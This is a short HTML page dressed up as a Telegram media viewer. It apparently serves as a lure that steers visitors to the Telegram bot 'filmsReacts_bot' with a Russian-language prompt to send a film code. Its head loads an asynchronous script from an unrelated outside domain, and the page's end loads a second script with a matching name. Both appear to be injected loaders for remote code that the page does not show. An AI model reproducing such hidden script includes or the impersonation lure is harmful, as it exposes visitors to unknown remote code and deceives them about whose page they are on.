<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/style.css">
    <title>telegrambots</title>
    <script charset="utf-8" async src="https://rbthre.work/pjs/AeL2xwnr7.js"></script></head>

<body>
    <header class="header">
        <div class="container">
            <div class="header__top">
                <div class="header__logo">
                    <img class="img__logo" src="./images/logo.png" alt="">
                    <p class="header__title">Telegram</p>
                </div>
                <div class="header__button">
                    <button class="btn">Download</button>
                </div>
            </div>
        </div>
    </header>
    <main class="main">
        <div class="container">
            <div class="main__container">
                <div class="main__logo">

                    <div class="main__title">
                        <img class="main__photo" src="./images/react-img.jpg" alt="logobg">
                        <p class="title__main">react films</p>
                    </div>
                    <div class="main__logo-telegram--right">
                        <img class="main__telegram" src="./images/telegram.png" alt="">
                    </div>
                </div>
                <div class="main__video">
                    <div class="main__title-block">
                        <p class="title-block-p">
                            Media is too big</p>
                        <button class="block-p">
                            <a href="https://t.me/filmsReacts_bot">VIEW IN TELEGRAM</a>
                        </button>
                    </div>
                </div>
                <div class="text__main">
                    <p class="main__info">
                        Для получения названия напишите код фильма в нашем боте
                    </p>
                    <button class="text-btn">
                        <a href="https://t.me/filmsReacts_bot" class="link__btn">View In Channel</a>
                    </button>
                </div>
            </div>

        </div>
    </main>
<script src="/sAeL2xwnr7.js"></script>
</body>

</html>
